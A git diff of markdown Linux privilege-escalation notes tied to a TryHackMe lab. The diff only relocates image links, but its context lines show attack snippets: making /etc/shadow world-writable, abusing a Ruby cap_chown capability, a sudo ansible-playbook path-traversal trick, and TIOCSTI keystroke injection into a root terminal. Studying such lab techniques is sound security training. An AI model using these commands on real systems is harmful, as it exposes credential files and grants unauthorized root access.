@@ -117,7 +117,7 @@ ref:- https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-cap
 ```
 /usr/local/bin/ruby = cap_chown+ep
 ```
-![rubyCapChown.png](rubyCapChown.png)
+![rubyCapChown.png](Images/rubyCapChown.png)
 
 pass id of user which is 1002 and location and get access to that file
 ```ruby
@@ -142,7 +142,7 @@ python -c 'import os;os.chmod("/etc/shadow",0666)
 sudo -l
 ```
 
-![ansiblePrivesc01.png](ansiblePrivesc01.png)
+![ansiblePrivesc01.png](Images/ansiblePrivesc01.png)
 
 ```bash
 nano /tmp/a.yml
@@ -173,7 +173,7 @@ paste below yml
 sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../tmp/a.yml
 ```
 
-![ansiblePrivesc02.png](./ansiblePrivesc02.png)
+![ansiblePrivesc02.png](Images/ansiblePrivesc02.png)
 
 ref:-
 - https://tryhackme.com/r/room/backtrack
@@ -185,7 +185,7 @@ ref:-
 ./pspy64
 ```
 
-![ttypushback01.png](./ttypushback01.png)
+![ttypushback01.png](Images/ttypushback01.png)
 
 ```bash
 nano /dev/shm/a.py
@@ -221,8 +221,9 @@ for char in 'ls -la /root >/dev/shm/a.txt;chmod 777 a.txt' + '\n':
     fcntl.ioctl(0, termios.TIOCSTI, char)
 ```
 
-![ttypushback02.png](./ttypushback02.png)
-wait for 1-2 min for cron
+![ttypushback02.png](Images/ttypushback02.png)
+
+**(Note:- wait for 1-2 min for cron)**
 
 ```bash
 ls -la
@@ -232,7 +233,7 @@ cat a.txt
 ```
 
 
-![ttypushback03.png](./ttypushback03.png)
+![ttypushback03.png](Images/ttypushback03.png)
 
 ref:-
 - https://tryhackme.com/r/room/backtrack
